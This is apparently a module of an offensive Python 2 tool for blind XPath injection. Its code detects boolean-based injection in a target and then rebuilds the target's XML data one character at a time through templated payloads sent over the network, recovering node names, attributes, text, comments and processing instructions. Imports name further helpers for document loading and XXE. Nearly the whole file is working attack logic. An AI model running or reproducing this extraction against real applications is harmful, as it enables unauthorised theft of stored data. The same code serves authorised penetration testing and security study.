import socket, time
#-------------------------------------------------------------------------------
from XPath_functions    import count                                            #1
from XPath_functions    import string_length                                    #2
from XPath_functions    import substring                                        #3
from XPath_functions    import doc                                              #4
from XPath_functions    import unparsed_text                                    #5
from XPath_functions    import reverse                                          #6
from XPath_functions    import concat2                                          #7
from XPath_functions    import concat3                                          #8
from XPath_functions    import using_doc                                        #9
from XPath_functions    import encode_for_uri                                   #10
from XPath_functions    import simple_count                                     #11
from XPath_functions    import if_then                                          #12
from XPath_functions    import string                                           #13
from XPath_functions    import xxe_doc                                          #14
from XPath_functions    import url                                              #15
from XPath_functions    import more_then                                        #16
#-------------------------------------------------------------------------------
from XPath_elements     import name                                             #1
from XPath_elements     import nodes                                            #2
from XPath_elements     import node                                             #3
from XPath_elements     import text                                             #4
from XPath_elements     import arguments                                        #5
from XPath_elements     import argument                                         #6
from XPath_elements     import comments                                         #7
from XPath_elements     import comment                                          #8
from XPath_elements     import namespace_uri                                    #9
from XPath_elements     import processing_instructions                          #10
from XPath_elements     import processing_instruction                           #11
from XPath_elements     import NODE                                             #12
from XPath_elements     import ARG                                              #13
from XPath_elements     import COMM                                             #14
from XPath_elements     import PRIN                                             #15
#-------------------------------------------------------------------------------
from checker            import bb_checker
from checker            import tb_checker
#-------------------------------------------------------------------------------
from templates          import base_templates, template, choose_tag
from network_connection import NETCON
#-------------------------------------------------------------------------------
DEBUG = False
################################################################################


################################################################################
string_of_chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ _@/[]}{():^$#*-+=%,.<>"
################################################################################


################################################################################
def bb_test(b, _netcon, _t, _doc):                                              #bb_test
    for i in _t:
        s1 = template(i,count(nodes(_doc),1))
        s2 = template(i,count(nodes(_doc),0))
        if b[0] == 'true':
            if bb_checker(_netcon,choose_tag(i,s1),b[1],b[0]) and\
                not bb_checker(_netcon,choose_tag(i,s2),b[1],b[0]):
                print '[\033[94mINFO\033[92m]: boolean-based available :',b,i[0],i[1]
                return True, i
        else:
            if bb_checker(_netcon,choose_tag(i,s2),b[1],b[0]) and\
                not bb_checker(_netcon,choose_tag(i,s1),b[1],b[0]):
                print '[\033[94mINFO\033[92m]: boolean-based available :',b,i[0],i[1]
                return True, i
    print '[\033[94mINFO\033[92m]: boolean-based vulnerability not found :',b
    return False, None
################################################################################


################################################################################
def count_elem(             b,              _netcon,    t,   _xpath):           #count_elem
    s = template(t,count(_xpath,0))
    if bb_checker(_netcon,choose_tag(t,s),b[1],b[0]):
        return
    result = 1
    s = template(t,count(_xpath,result))
    while not bb_checker(_netcon,choose_tag(t,s),b[1],b[0]):
        result = result + 1
        s = template(t,count(_xpath,result))
    return result
#-------------------------------------------------------------------------------
def step(             b,              _netcon,    t,   _xpath):                 #step
    s = template(t,string_length(_xpath,0))
    if bb_checker(_netcon,choose_tag(t,s),b[1],b[0]):
        return
    length = 0
    s = template(t,string_length(_xpath,length))
    while not bb_checker(_netcon,choose_tag(t,s),b[1],b[0]):
        length = length + 1
        s = template(t,string_length(_xpath,length))
    result = ""
    for _i in range(1,length+1):
        f = True
        for _j in string_of_chars:
            s = template(t,substring(_xpath,_i,_j))
            if bb_checker(_netcon,choose_tag(t,s),b[1],b[0]):
                result = result + _j;
                f = False
                break
        if f:
            result = result + '\033[34m?\033[0m';
    return result
#-------------------------------------------------------------------------------
def argument_cycle(     b,              _netcon,    t,   _xpath):               #argument_cycle
    A = ARG()
    amount = count_elem(b,_netcon,t,A.S(_xpath))
    if amount != None:
        s = ""
        for i in range(1, amount+1):
            result = step(  b,             _netcon,    t, name(A.E(_xpath,i)))
            if result != None:
                s = s+' '+result+'='
            result = step(  b,             _netcon,    t, A.E(_xpath,i))
            if result != None:
                s = s+'"'+result+'"'
        return s
    return
#-------------------------------------------------------------------------------
def comment_cycle(      b,              _netcon,    t,   _xpath,    tab):       #comment_cycle
    C = COMM()
    amount = count_elem(b,_netcon,t,C.S(_xpath))
    if amount != None:
        for i in range(1, amount+1):
            s = ""
            result = step(  b,             _netcon,    t, C.E(_xpath,i))
            if result != None:
                s = s+'\n'+tab+'<!--'+result+'-->'
            print s
    return
#-------------------------------------------------------------------------------
def proc_cycle(         b,              _netcon,    t,   _xpath,    tab):       #proc_cycle
    P = PRIN()
    amount = count_elem(b,_netcon,t,P.S(_xpath))
    if amount != None:
        for i in range(1, amount+1):
            s = ""
            result = step(  b,             _netcon,    t, name(P.E(_xpath,i)))
            if result != None:
                s = s+'\n'+tab+'<?'+result+' '
            result = step(  b,             _netcon,    t, P.E(_xpath,i))
            if result != None:
                s = s+result+'?>'
            print s
    return
#-------------------------------------------------------------------------------
def recursive_descent(  b,              _netcon,    t,  _xpath, _deep):         #recursive_descent
    N = NODE()
    amount = count_elem(b,_netcon,t,N.S(_xpath))
    if amount != None:
        tab = _deep*"\t"
        for i in range(1, amount+1):
            s = tab+"<"
            find_node = tab+"</"
            result = step(      b,      _netcon,    t,  name(N.E(_xpath,i)))
            if result != None:
                find_node = find_node+result
                s = s+result
            #Most databases doesn't support
            #result = step(b,_netcon,t,namespace_uri(N.E(_xpath,i)))
            #if result != None:
            #    s = s+' xmlns="'+result+'"'
            result = argument_cycle( b, _netcon,    t,  N.E(_xpath,i))
            if result != None:
                s = s+result
            s = s+">"
            print s
            result = step(      b,      _netcon,    t,  text(N.E(_xpath,i)))
            if result != None:
                print result
                print find_node+">"
                continue
            result = comment_cycle(  b, _netcon,    t,  N.E(_xpath,i), tab+'\t')
            result = proc_cycle(     b, _netcon,    t,  N.E(_xpath,i), tab+'\t')
            recursive_descent(  b,      _netcon,    t,  N.E(_xpath,i),  _deep+1)
            print find_node+">"
    return
################################################################################


################################################################################
def test(_settings, _netcon,_doc):                                              #test
    try:
        if _settings.available('template'):
            _t = [_settings.get('template')]
            if '"' in _t[0][1]:
                _t[0].append('"')
            else:
                _t[0].append('\'')
        else:
            _t = base_templates
        if _settings.available('b'):
            print '[\033[94mINFO\033[92m]: boolean-based checking ...'
            XPIsettings = bb_test(_settings.get('b'),_netcon,_t,_doc)
            if DEBUG:
                print XPIsettings
        return
    except Exception,e:
        print ("[\033[91mERROR\033[92m]: Unexpected termination"
              +" of the program from boolean_tester")
        print "Reason:",e
        exit()
#-------------------------------------------------------------------------------
def scan(_settings, _netcon, _doc):                                             #scan
    try:
        if _settings.available('template'):
            _t = [_settings.get('template')]
            if '"' in _t[0][1]:
                _t[0].append('"')
            else:
                _t[0].append('\'')
        else:
            _t = base_templates
        if _settings.available('b'):
            print '[\033[94mINFO\033[92m]: boolean-based checking ...'
            XPIsettings = bb_test(_settings.get('b'),_netcon,_t,_doc)
            if XPIsettings[0]:
                recursive_descent(_settings.get('b'),_netcon,XPIsettings[1],_doc,0)
            if DEBUG:
                print XPIsettings
    except Exception,e:
        print ("[\033[91mERROR\033[92m]: Unexpected termination"
              +" of the program from boolean_tester")
        print "Reason:",e
        exit()
